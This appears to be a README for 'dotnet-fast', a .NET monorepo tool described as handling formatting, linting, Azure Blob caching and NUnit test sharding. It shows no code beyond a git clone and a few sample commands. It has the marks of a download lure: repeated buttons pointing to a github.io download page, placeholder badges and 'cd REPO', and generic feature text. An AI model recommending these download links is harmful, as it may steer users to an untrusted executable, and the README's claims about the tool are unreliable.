# dotnet-fast v2026 - .NET workspace tooling 2026

> **Speed-focused .NET workspace tooling for Windows, Linux, and macOS, with monorepo support for formatting, linting, cache reuse, and CI test sharding in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Windows%2FLinux%2FmacOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jasonpkqkelly9615/dotnet-fast-monorepo-tools?style=flat-square)](https://github.com/jasonpkqkelly9615/dotnet-fast-monorepo-tools)

---

<p align="center">
  <a href="https://jasonpkqkelly9615.github.io/dotnet-fast-monorepo-tools/">
    <img src="https://img.shields.io/badge/Download-dotnet--fast%20Latest-brightgreen?style=for-the-badge" alt="Download dotnet-fast">
  </a>
</p>

> **[Download dotnet-fast v2026](https://jasonpkqkelly9615.github.io/dotnet-fast-monorepo-tools/)**

---

[Download Latest Build](https://jasonpkqkelly9615.github.io/dotnet-fast-monorepo-tools/)

---

## What is dotnet-fast?

dotnet-fast helps .NET teams shorten development and CI feedback cycles in large workspaces. It is especially suited to monorepos and multi-project repositories, where running formatting, linting, and tests across everything can consume significant time.

The tooling combines local workflow automation with CI-oriented capabilities. It can determine which projects were affected by Git changes, reuse build results through an Azure Blob remote cache, and divide NUnit tests among CI jobs for better distribution.

---

## Key capabilities

- Streamlined formatting and linting for .NET codebases
- Git-based identification of projects affected by changes
- Remote build-result reuse through Azure Blob storage
- NUnit test distribution across CI shards
- SARIF reports for code analysis workflows
- JSON responses intended for scripts and other automation
- Integration support for Azure DevOps and GitHub Actions
- Workspace conventions suitable for monorepos and multi-project layouts

---

## Getting started

Either clone the repository or obtain the latest build, then keep the executable wherever it fits your workspace setup.

    git clone https://github.com/jasonpkqkelly9615/dotnet-fast-monorepo-tools.git
    cd REPO

Once available, invoke dotnet-fast in a terminal or add it to the relevant stages of your CI workflow.

---

## Commands and workflow

Execute dotnet-fast from the top-level directory of your .NET workspace. The tool can then concentrate processing on projects touched by recent Git changes.

Common workflow tasks include:

- formatting only projects affected before committing
- linting impacted parts of the repository
- emitting SARIF data for analysis platforms
- producing JSON for scripts and automated processes
- assigning NUnit tests to several CI workers

For example:

    dotnet-fast format
    dotnet-fast lint
    dotnet-fast test --shard
    dotnet-fast analyze --sarif
    dotnet-fast status --json

---

## Configuration

Settings can live in the repository configuration and in the CI environment, depending on the way dotnet-fast is incorporated into your workflow.

A representative configuration structure is:

    {
      "cache": {
        "provider": "azure-blob"
      },
      "output": {
        "format": "json",
        "sarif": true
      },
      "ci": {
        "sharding": "nunit"
      }
    }

Adjust the values for your workspace, cache endpoint, and pipeline arrangement.

---

## Requirements and compatibility

- Windows, Linux, or macOS
- A .NET workspace or a repository organized in a monorepo style
- Git for determining affected projects
- Azure Blob storage, if you want to use remote cache reuse
- Azure DevOps or GitHub Actions, when enabling CI pipeline integration

---

## Frequently asked questions

**Which operating systems are supported?**  
dotnet-fast is intended to run on Windows, Linux, and macOS.

**Is it suitable for continuous integration?**  
Yes. Azure DevOps and GitHub Actions are supported, along with CI test sharding and machine-readable output formats.

**What is the update process?**  
Download the newest build or pull the latest repository changes. Afterward, update local scripts or CI references as needed.

**Where are its settings controlled?**  
Repository configuration and environment-specific pipeline settings determine cache, output, and test-sharding behavior.

**What should I check when formatting or linting gives unexpected results?**  
Start by verifying the workspace path, current Git state, and configuration. You can then rerun the command with JSON or SARIF output for more detailed inspection.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
